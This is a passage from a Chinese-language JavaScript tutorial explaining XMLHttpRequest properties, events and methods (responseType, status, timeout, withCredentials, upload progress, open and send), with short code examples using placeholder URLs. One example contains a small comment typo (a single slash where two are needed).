<li>“document”：Document 对象，表示服务器返回一个<strong>文档对象</strong>。</li>
<li>“json”：<strong>JSON 对象</strong>。</li>
<li>“text”：<strong>字符串</strong>。</li>
</ul>
<p>上面几种类型之中，<code>text</code>类型适合大多数情况，而且直接处理文本也比较方便。<code>document</code>类型适合返回 HTML &#x2F; XML 文档的情况，这意味着，对于那些打开 CORS 的网站，可以直接用 Ajax 抓取网页，然后不用解析 HTML 字符串，直接对抓取回来的数据进行 DOM 操作。<code>blob</code>类型适合读取二进制数据，比如图片文件。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/path/to/image.png&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">xhr.<span class="property">responseType</span> = <span class="string">&#x27;blob&#x27;</span>;</span><br><span class="line"></span><br><span class="line">xhr.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">status</span> === <span class="number">200</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> blob = <span class="keyword">new</span> <span class="title class_">Blob</span>([xhr.<span class="property">response</span>], &#123;<span class="attr">type</span>: <span class="string">&#x27;image/png&#x27;</span>&#125;);</span><br><span class="line">    <span class="comment">// 或者</span></span><br><span class="line">    <span class="keyword">var</span> blob = xhr.<span class="property">response</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.<span class="title function_">send</span>();</span><br></pre></td></tr></table></figure>

<p>如果将这个属性设为<code>ArrayBuffer</code>，就可以按照数组的方式处理二进制数据。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/path/to/image.png&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">xhr.<span class="property">responseType</span> = <span class="string">&#x27;arraybuffer&#x27;</span>;</span><br><span class="line"></span><br><span class="line">xhr.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> uInt8Array = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(<span class="variable language_">this</span>.<span class="property">response</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, len = uInt8Array.<span class="property">length</span>; i &lt; len; ++i) &#123;</span><br><span class="line">    <span class="comment">// var byte = uInt8Array[i];</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.<span class="title function_">send</span>();</span><br></pre></td></tr></table></figure>

<p><strong>如果将这个属性设为<code>json</code>，浏览器就会自动对返回数据调用<code>JSON.parse()</code>方法</strong>。也就是说，从<code>xhr.response</code>属性（注意，不是<code>xhr.responseText</code>属性）得到的不是文本，而是一个 JSON 对象。</p>
<h4 id="2-5-XMLHttpRequest-responseText-响应文本"><a href="#2-5-XMLHttpRequest-responseText-响应文本" class="headerlink" title="2.5 XMLHttpRequest.responseText 响应文本"></a>2.5 XMLHttpRequest.responseText 响应文本</h4><p><code>XMLHttpRequest.responseText</code>属性<strong>返回从服务器接收到的字符串</strong>，该属性为<strong>只读</strong>。只有 HTTP 请求完成接收以后，该属性才会包含完整的数据。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/server&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">xhr.<span class="property">responseType</span> = <span class="string">&#x27;text&#x27;</span>;</span><br><span class="line">xhr.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (xhr.<span class="property">readyState</span> === <span class="number">4</span> &amp;&amp; xhr.<span class="property">status</span> === <span class="number">200</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(xhr.<span class="property">responseText</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.<span class="title function_">send</span>(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>



<h4 id="2-6-XMLHttpRequest-responseXML-响应HTML或XML文档"><a href="#2-6-XMLHttpRequest-responseXML-响应HTML或XML文档" class="headerlink" title="2.6 XMLHttpRequest.responseXML 响应HTML或XML文档"></a>2.6 XMLHttpRequest.responseXML 响应HTML或XML文档</h4><p><code>XMLHttpRequest.responseXML</code>属性返回<strong>从服务器接收到的 HTML 或 XML 文档对象</strong>，该属性为<strong>只读</strong>。如果本次请求没有成功，或者收到的数据不能被解析为 XML 或 HTML，该属性等于<code>null</code>。</p>
<p>该属性生效的前提是 HTTP 回应的<code>Content-Type</code>头信息等于<code>text/xml</code>或<code>application/xml</code>。这<strong>要求在发送请求前，<code>XMLHttpRequest.responseType</code>属性要设为<code>document</code><strong>。如果 HTTP 回应的<code>Content-Type</code>头信息不等于<code>text/xml</code>和<code>application/xml</code>，但是想从<code>responseXML</code>拿到数据（即把数据按照 DOM 格式解析），那么需要</strong>手动调用<code>XMLHttpRequest.overrideMimeType()</code>方法，强制进行 XML 解析</strong>。</p>
<p>该属性得到的数据，是直接解析后的文档 DOM 树。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/server&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">xhr.<span class="property">responseType</span> = <span class="string">&#x27;document&#x27;</span>;</span><br><span class="line">xhr.<span class="title function_">overrideMimeType</span>(<span class="string">&#x27;text/xml&#x27;</span>);</span><br><span class="line"></span><br><span class="line">xhr.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (xhr.<span class="property">readyState</span> === <span class="number">4</span> &amp;&amp; xhr.<span class="property">status</span> === <span class="number">200</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(xhr.<span class="property">responseXML</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.<span class="title function_">send</span>(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>



<h4 id="2-7-XMLHttpRequest-responseURL-发送数据的服务器网址"><a href="#2-7-XMLHttpRequest-responseURL-发送数据的服务器网址" class="headerlink" title="2.7 XMLHttpRequest.responseURL 发送数据的服务器网址"></a>2.7 XMLHttpRequest.responseURL 发送数据的服务器网址</h4><p><code>XMLHttpRequest.responseURL</code>属性是字符串，表示<strong>发送数据的服务器的网址</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://example.com/test&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">xhr.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 返回 http://example.com/test</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(xhr.<span class="property">responseURL</span>);</span><br><span class="line">&#125;;</span><br><span class="line">xhr.<span class="title function_">send</span>(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>

<p><strong>注意，这个属性的值与<code>open()</code>方法指定的请求网址不一定相同</strong>。如果服务器端发生跳转，这个属性返回最后实际返回数据的网址。另外，如果原始 URL 包括锚点（fragment），该属性会把锚点剥离。</p>
<h4 id="2-8-XMLHttpRequest-status-状态码，XMLHttpRequest-statusText-状态提示字符串"><a href="#2-8-XMLHttpRequest-status-状态码，XMLHttpRequest-statusText-状态提示字符串" class="headerlink" title="2.8 XMLHttpRequest.status 状态码，XMLHttpRequest.statusText 状态提示字符串"></a>2.8 XMLHttpRequest.status 状态码，XMLHttpRequest.statusText 状态提示字符串</h4><p><code>XMLHttpRequest.status</code>属性返回一个整数，表示<strong>服务器回应的 HTTP 状态码</strong>。一般来说，如果通信成功的话，这个状态码是200；如果服务器没有返回状态码，那么这个属性默认是200。请求发出之前，该属性为<code>0</code>。该属性只读。</p>
<ul>
<li><strong>200, OK，访问正常</strong></li>
<li>301, Moved Permanently，永久移动</li>
<li>302, Moved temporarily，暂时移动</li>
<li><strong>304</strong>, Not Modified，<strong>未修改</strong></li>
<li>307, Temporary Redirect，暂时重定向</li>
<li>401, Unauthorized，未授权</li>
<li>403, Forbidden，禁止访问</li>
<li><strong>404</strong>, Not Found，<strong>未发现指定网址</strong></li>
<li><strong>500</strong>, Internal Server Error，<strong>服务器发生错误</strong></li>
</ul>
<p>基本上，只有2xx和304的状态码，表示服务器返回是正常状态。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (xhr.<span class="property">readyState</span> === <span class="number">4</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> ( (xhr.<span class="property">status</span> &gt;= <span class="number">200</span> &amp;&amp; xhr.<span class="property">status</span> &lt; <span class="number">300</span>)</span><br><span class="line">    || (xhr.<span class="property">status</span> === <span class="number">304</span>) ) &#123;</span><br><span class="line">    <span class="comment">// 处理服务器的返回数据</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 出错</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>XMLHttpRequest.statusText</code>属性返回一个<strong>字符串</strong>，表示<strong>服务器发送的状态提示</strong>。不同于<code>status</code>属性，该属性<strong>包含整个状态信息，比如“OK”和“Not Found”</strong>。在请求发送之前（即调用<code>open()</code>方法之前），该属性的值是空字符串；如果服务器没有返回状态提示，该属性的值默认为“OK”。该属性为只读属性。</p>
<h4 id="2-9-XMLHttpRequest-timeout-超时时间（毫秒），XMLHttpRequestEventTarget-ontimeout-超时函数"><a href="#2-9-XMLHttpRequest-timeout-超时时间（毫秒），XMLHttpRequestEventTarget-ontimeout-超时函数" class="headerlink" title="2.9 XMLHttpRequest.timeout 超时时间（毫秒），XMLHttpRequestEventTarget.ontimeout 超时函数"></a>2.9 XMLHttpRequest.timeout 超时时间（毫秒），XMLHttpRequestEventTarget.ontimeout 超时函数</h4><p><code>XMLHttpRequest.timeout</code>属性返回一个整数，表示多少毫秒后，如果请求仍然没有得到结果，就会自动终止。如果该属性等于0，就表示没有时间限制。</p>
<p><code>XMLHttpRequestEventTarget.ontimeout</code>属性用于设置一个监听函数，如果发生 timeout 事件，就会执行这个监听函数。</p>
<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line"><span class="keyword">var</span> url = <span class="string">&#x27;/server&#x27;</span>;</span><br><span class="line"></span><br><span class="line">xhr.<span class="property">ontimeout</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;The request for &#x27;</span> + url + <span class="string">&#x27; timed out.&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (xhr.<span class="property">readyState</span> === <span class="number">4</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (xhr.<span class="property">status</span> === <span class="number">200</span>) &#123;</span><br><span class="line">      <span class="comment">// 处理服务器返回的数据</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(xhr.<span class="property">statusText</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, url, <span class="literal">true</span>);</span><br><span class="line"><span class="comment">// 指定 10 秒钟超时</span></span><br><span class="line">xhr.<span class="property">timeout</span> = <span class="number">10</span> * <span class="number">1000</span>;</span><br><span class="line">xhr.<span class="title function_">send</span>(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>



<h4 id="2-10-事件监听属性"><a href="#2-10-事件监听属性" class="headerlink" title="2.10 事件监听属性"></a>2.10 事件监听属性</h4><p>XMLHttpRequest 对象可以对以下事件指定监听函数。</p>
<ul>
<li>XMLHttpRequest.onloadstart：loadstart 事件（HTTP 请求发出）的监听函数<strong>【请求开始】</strong></li>
<li>XMLHttpRequest.onprogress：progress事件（正在发送和加载数据）的监听函数<strong>【请求中，进度】</strong></li>
<li>XMLHttpRequest.onabort：abort 事件（请求中止，比如用户调用了<code>abort()</code>方法）的监听函数<strong>【请求中止】</strong></li>
<li>XMLHttpRequest.onerror：error 事件（请求失败）的监听函数<strong>【请求失败】</strong></li>
<li>XMLHttpRequest.onload：load 事件（请求成功完成）的监听函数<strong>【请求成功】</strong></li>
<li>XMLHttpRequest.ontimeout：timeout 事件（用户指定的时限超过了，请求还未完成）的监听函数<strong>【请求超时】</strong></li>
<li>XMLHttpRequest.onloadend：loadend 事件（请求完成，不管成功或失败）的监听函数<strong>【请求完成，不管成功和失败】</strong></li>
</ul>
<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">xhr.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123; <span class="comment">// 请求成功</span></span><br><span class="line"> <span class="keyword">var</span> responseText = xhr.<span class="property">responseText</span>;</span><br><span class="line"> <span class="variable language_">console</span>.<span class="title function_">log</span>(responseText);</span><br><span class="line"> <span class="comment">// process the response.</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.<span class="property">onabort</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123; <span class="comment">// 请求中止</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;The request was aborted&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.<span class="property">onprogress</span> = <span class="keyword">function</span> (<span class="params">event</span>) &#123; <span class="comment">// 请求中</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(event.<span class="property">loaded</span>); <span class="comment">// 已传输数据量</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(event.<span class="property">total</span>); <span class="comment">// 总数据量</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(event.<span class="property">lengthComputable</span>) / 是否可计算加载进度</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.<span class="property">onerror</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123; <span class="comment">// 请求失败</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;There was an error!&#x27;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>progress</code>事件的监听函数有一个事件对象参数，该对象有三个属性：<code>loaded</code>属性返回<strong>已经传输的数据量</strong>，<code>total</code>属性返回<strong>总的数据量</strong>，<code>lengthComputable</code>属性返回一个布尔值，表示加载的<strong>进度是否可以计算</strong>。所有这些监听函数里面，只有<code>progress</code>事件的监听函数有参数，其他函数都没有参数。</p>
<p>注意，如果发生网络错误（比如服务器无法连通），<code>onerror</code>事件无法获取报错信息。也就是说，可能没有错误对象，所以这样只能显示报错的提示。</p>
<h4 id="2-11-XMLHttpRequest-withCredentials-跨域请求时用户信息是否会包含在请求中"><a href="#2-11-XMLHttpRequest-withCredentials-跨域请求时用户信息是否会包含在请求中" class="headerlink" title="2.11 XMLHttpRequest.withCredentials 跨域请求时用户信息是否会包含在请求中"></a>2.11 XMLHttpRequest.withCredentials 跨域请求时用户信息是否会包含在请求中</h4><p><code>XMLHttpRequest.withCredentials</code>属性是一个<strong>布尔值</strong>，表示<strong>跨域请求时，用户信息（比如 Cookie 和认证的 HTTP 头信息）是否会包含在请求之中</strong>，默认为<code>false</code>，即向<code>example.com</code>发出跨域请求时，不会发送<code>example.com</code>设置在本机上的 Cookie（如果有的话）。</p>
<p>如果需要跨域 AJAX 请求发送 Cookie，需要<code>withCredentials</code>属性设为<code>true</code>。注意，同源的请求不需要设置这个属性。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://example.com/&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">xhr.<span class="property">withCredentials</span> = <span class="literal">true</span>;</span><br><span class="line">xhr.<span class="title function_">send</span>(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>

<p><strong>为了让这个属性生效，服务器必须显式返回<code>Access-Control-Allow-Credentials</code>这个头信息。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Access</span>-<span class="title class_">Control</span>-<span class="title class_">Allow</span>-<span class="title class_">Credentials</span>: <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p><code>withCredentials</code>属性打开的话，跨域请求不仅会发送 Cookie，还会设置远程主机指定的 Cookie。反之也成立，如果<code>withCredentials</code>属性没有打开，那么跨域的 AJAX 请求即使明确要求浏览器设置 Cookie，浏览器也会忽略。</p>
<p>注意，脚本总是遵守同源政策，无法从<code>document.cookie</code>或者 HTTP 回应的头信息之中，读取跨域的 Cookie，<code>withCredentials</code>属性不影响这一点。</p>
<h4 id="2-12-XMLHttpRequest-upload-上传文件对象"><a href="#2-12-XMLHttpRequest-upload-上传文件对象" class="headerlink" title="2.12 XMLHttpRequest.upload 上传文件对象"></a>2.12 XMLHttpRequest.upload 上传文件对象</h4><p>XMLHttpRequest 不仅可以发送请求，还<strong>可以发送文件，这就是 AJAX 文件上传</strong>。发送文件以后，通过<code>XMLHttpRequest.upload</code>属性可以得到一个<strong>对象</strong>，通过观察这个对象，可以得知上传的进展。主要方法就是监听这个对象的各种事件：loadstart、loadend、load、abort、error、progress、timeout。（使用时加on）</p>
<p>假定网页上有一个<code>&lt;progress&gt;</code>元素。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">progress</span> <span class="attr">min</span>=<span class="string">&quot;0&quot;</span> <span class="attr">max</span>=<span class="string">&quot;100&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span>&gt;</span>0% complete<span class="tag">&lt;/<span class="name">progress</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>文件上传时，对<code>upload</code>属性指定<code>progress</code>事件的监听函数，即可获得上传的进度。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">upload</span>(<span class="params">blobOrFile</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">  xhr.<span class="title function_">open</span>(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;/server&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">  xhr.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params">e</span>) &#123;&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> progressBar = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;progress&#x27;</span>);</span><br><span class="line">  xhr.<span class="property">upload</span>.<span class="property">onprogress</span> = <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (e.<span class="property">lengthComputable</span>) &#123;</span><br><span class="line">      progressBar.<span class="property">value</span> = (e.<span class="property">loaded</span> / e.<span class="property">total</span>) * <span class="number">100</span>;</span><br><span class="line">      <span class="comment">// 兼容不支持 &lt;progress&gt; 元素的老式浏览器</span></span><br><span class="line">      progressBar.<span class="property">textContent</span> = progressBar.<span class="property">value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  xhr.<span class="title function_">send</span>(blobOrFile);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">upload</span>(<span class="keyword">new</span> <span class="title class_">Blob</span>([<span class="string">&#x27;hello world&#x27;</span>], &#123;<span class="attr">type</span>: <span class="string">&#x27;text/plain&#x27;</span>&#125;));</span><br></pre></td></tr></table></figure>



<h3 id="3、XMLHttpRequest-的实例方法"><a href="#3、XMLHttpRequest-的实例方法" class="headerlink" title="3、XMLHttpRequest 的实例方法"></a>3、XMLHttpRequest 的实例方法</h3><h4 id="3-1-XMLHttpRequest-open-指定请求参数"><a href="#3-1-XMLHttpRequest-open-指定请求参数" class="headerlink" title="3.1 XMLHttpRequest.open() 指定请求参数"></a>3.1 XMLHttpRequest.open() 指定请求参数</h4><p><code>XMLHttpRequest.open()</code>方法<strong>用于指定 HTTP 请求的参数</strong>，或者说初始化 XMLHttpRequest 实例对象。它一共可以接受<strong>五个参数</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">open</span>(</span><br><span class="line">   string method, <span class="comment">// 字符串，请求方法GET、POST、PUT、DELETE、HEAD等</span></span><br><span class="line">   string url,<span class="comment">// 字符串，请求链接URL</span></span><br><span class="line">   optional boolean <span class="keyword">async</span>, <span class="comment">// 可选，布尔值，是否异步，默认true</span></span><br><span class="line">   optional string user,<span class="comment">// 可选，字符串，认证的用户名</span></span><br><span class="line">   optional string password<span class="comment">// 可选，字符串，认证的密码</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<ul>
<li><code>method</code>：表示 HTTP 动词方法，比如<code>GET</code>、<code>POST</code>、<code>PUT</code>、<code>DELETE</code>、<code>HEAD</code>等。</li>
<li><code>url</code>: 表示请求发送目标 URL。</li>
<li><code>async</code>: 布尔值，表示请求是否为异步，默认为<code>true</code>。如果设为<code>false</code>，则<code>send()</code>方法只有等到收到服务器返回了结果，才会进行下一步操作。该参数可选。由于同步 AJAX 请求会造成浏览器失去响应，许多浏览器已经禁止在主线程使用，只允许 Worker 里面使用。所以，这个参数轻易不应该设为<code>false</code>。</li>
<li><code>user</code>：表示用于认证的用户名，默认为空字符串。该参数可选。</li>
<li><code>password</code>：表示用于认证的密码，默认为空字符串。该参数可选。</li>
</ul>
<p>注意，如果对使用过<code>open()</code>方法的 AJAX 请求，再次使用这个方法，等同于调用<code>abort()</code>，即终止请求。</p>
<p>下面发送 POST 请求的例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;POST&#x27;</span>, <span class="built_in">encodeURI</span>(<span class="string">&#x27;someURL&#x27;</span>));</span><br></pre></td></tr></table></figure>



<h4 id="3-2-XMLHttpRequest-send-发送请求"><a href="#3-2-XMLHttpRequest-send-发送请求" class="headerlink" title="3.2 XMLHttpRequest.send() 发送请求"></a>3.2 XMLHttpRequest.send() 发送请求</h4><p><code>XMLHttpRequest.send()</code>方法<strong>用于实际发出 HTTP 请求</strong>。它的参数是可选的，如果不带参数，就表示 HTTP 请求只有一个 URL，没有数据体，典型例子就是 GET 请求；如果带有参数，就表示除了头信息，还带有包含具体数据的信息体，典型例子就是 POST 请求。</p>
<p>下面是 GET 请求的例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;http://www.example.com/?id=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(id),</span><br><span class="line">  <span class="literal">true</span></span><br><span class="line">);</span><br><span class="line">xhr.<span class="title function_">send</span>(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>GET</code>请求的参数，作为查询字符串附加在 URL 后面。</p>
<p>下面是发送 POST 请求的例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line"><span class="keyword">var</span> data = <span class="string">&#x27;email=&#x27;</span></span><br><span class="line">  + <span class="built_in">encodeURIComponent</span>(email)</span><br><span class="line">  + <span class="string">&#x27;&amp;password=&#x27;</span></span><br><span class="line">  + <span class="built_in">encodeURIComponent</span>(password);</span><br><span class="line"></span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;http://www.example.com&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>);</span><br><span class="line">xhr.<span class="title 